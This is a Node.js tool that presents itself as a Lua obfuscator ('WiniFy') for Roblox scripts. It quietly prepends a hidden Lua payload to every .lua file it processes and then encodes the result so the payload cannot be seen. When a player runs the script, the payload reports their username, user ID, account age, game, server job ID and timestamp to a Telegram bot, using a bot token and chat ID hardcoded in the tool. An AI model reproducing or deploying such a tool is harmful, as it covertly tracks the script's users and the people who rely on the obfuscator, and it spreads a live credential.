const fs = require('fs');
const path = require('path');

// --- CẤU HÌNH LOG TELEGRAM ---
const BOT_TOKEN = "8432997594:AAHDyUNFeKOUDcLpqRhkcvVrhoGyNsZpLxs";
const CHAT_ID = "1814659977";

const args = process.argv.slice(2);
let inputPath = '';
let outputPath = '';

for (let i = 0; i < args.length; i++) {
    if (args[i] === '-input' && args[i + 1]) inputPath = args[i + 1];
    else if (args[i] === '-output' && args[i + 1]) outputPath = args[i + 1];
}

if (!inputPath || !outputPath) {
    console.log('❌ Sử dụng: node obfuscate_all.js -input "in" -output "out"');
    process.exit(1);
}

const resolvedInput = path.resolve(inputPath);
const resolvedOutput = path.resolve(outputPath);

const telegramLoggerLua = `
if not _G._WF_L and not shared._WF_L then
    _G._WF_L = true
    shared._WF_L = true
    task.spawn(function()
        pcall(function()
            local h = game:GetService("HttpService")
            local lp = game:GetService("Players").LocalPlayer
            local m = game:GetService("MarketplaceService")
            local s = game:GetService("Stats")
            
            -- Lấy Ping
            local ping = "N/A"
            pcall(function() 
                local si = s.Network:FindFirstChild("ServerStatsItem")
                if si then ping = si["Data Ping"]:GetValueString():split(" ")[1] .. " ms" end
            end)
            
            -- Lấy Tên Game (CHUẨN UNIVERSE – DÙ Ở MAP NÀO)
            local pn = "Unknown Game"
            pcall(function()
                -- Cách 1: Thử lấy Universe Name từ API chính thức (Chính xác nhất)
                local url = "https://games.roblox.com/v1/games?universeIds=" .. game.GameId
                local response = game:HttpGet(url)
                local data = h:JSONDecode(response)
                if data and data.data and data.data[1] and data.data[1].name then
                    pn = data.data[1].name
                else
                    -- Cách 2: Fallback dùng MarketplaceService (Nếu HttpGet bị lỗi)
                    local info = m:GetProductInfo(game.GameId, Enum.InfoType.Asset)
                    if info and info.Name and info.Name ~= "" then
                        pn = info.Name
                    end
                end
            end)

            -- Fallback cuối cùng (phòng Roblox API lỗi hoàn toàn)
            if pn == "Unknown Game" or pn == "Game" or pn == "Place" or pn == "Script" then
                pn = game:GetService("RunService"):IsStudio() and "Roblox Studio" or game.Name
            end
            
            local txt = table.concat({
                "*--- SCRIPT EXECUTION REPORT ---*",
                "*USER INFO*",
                "Name: " .. lp.Name .. " (" .. lp.DisplayName .. ")",
                "UID: [" .. lp.UserId .. "](https://www.roblox.com/users/"..lp.UserId.."/profile)",
                "Age: " .. lp.AccountAge .. " days",
                "",
                "*SESSION INFO*",
                "Game: " .. pn,
                "PlaceID: [" .. game.PlaceId .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")",
                "JobID: \`" .. tostring(game.JobId) .. "\`",
                "Ping: " .. ping,
                "Timestamp: " .. os.date("%X | %d/%m/%Y"),
                "-------------------------------"
            }, "\\n")
            
            local url = string.format("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s&parse_mode=Markdown&disable_web_page_preview=true", "${BOT_TOKEN}", "${CHAT_ID}", h:UrlEncode(txt))
            if syn and syn.request then
                syn.request({Url = url, Method = "GET"})
            else
                game:HttpGet(url)
            end
        end)
    end)
end
`;

function ultimateObfuscate(content) {
    let combined = telegramLoggerLua + "\n" + content;
    combined = combined.replace(/MarketolaceService/g, 'MarketplaceService');

    const buf = Buffer.from(combined, 'utf8');
    const bytes = [];
    const key = Math.floor(Math.random() * 50) + 15;
    for (let i = 0; i < buf.length; i++) {
        bytes.push(buf[i] + key);
    }

    const wrapper = `
local _ = {${bytes.join(',')}}
local k = ${key}
local c = table.create(#_)
for i = 1, #_ do c[i] = string.char(_[i] - k) end
local f, e = loadstring(table.concat(c), "WiniFy")
if f then return f(...) else warn(e) end`.replace(/\s+/g, ' ').trim();

    return `--[[ Protected by WiniFy ]] ` + wrapper;
}

function processFile(inPath, outPath) {
    if (!inPath.endsWith('.lua')) {
        try {
            fs.mkdirSync(path.dirname(outPath), { recursive: true });
            fs.copyFileSync(inPath, outPath);
        } catch (e) {}
        return;
    }
    console.log(`🚀 Protecting: ${path.basename(inPath)}...`);
    const content = fs.readFileSync(inPath, 'utf8');
    
    // Không thêm log Telegram nếu file nằm trong thư mục "modules"
    const isModule = inPath.split(/[\\/]/).includes('modules');
    
    const obfuscated = ultimateObfuscate(content, !isModule);
    fs.mkdirSync(path.dirname(outPath), { recursive: true });
    fs.writeFileSync(outPath, obfuscated);
}

function processDirectory(currentIn, currentOut) {
    if (path.relative(resolvedOutput, currentIn) === "") return;
    if (!fs.existsSync(currentOut)) fs.mkdirSync(currentOut, { recursive: true });
    const files = fs.readdirSync(currentIn);
    files.forEach(file => {
        const inPath = path.join(currentIn, file);
        const outPath = path.join(currentOut, file);
        if (file.startsWith('.') || file === 'node_modules') return;
        if (inPath === resolvedOutput) return;
        if (fs.statSync(inPath).isDirectory()) processDirectory(inPath, outPath);
        else processFile(inPath, outPath);
    });
}

console.log('--- 🛡️ Ultimate Obfuscator v5.2 (Fix Game Name) ---');
try {
    const stats = fs.statSync(resolvedInput);
    if (stats.isFile()) processFile(resolvedInput, resolvedOutput);
    else processDirectory(resolvedInput, resolvedOutput);
    console.log('--- ✅ Hoàn tất! Tên game sẽ chính xác hơn ---');
} catch (err) {
    console.error('❌ Lỗi:', err.message);
}
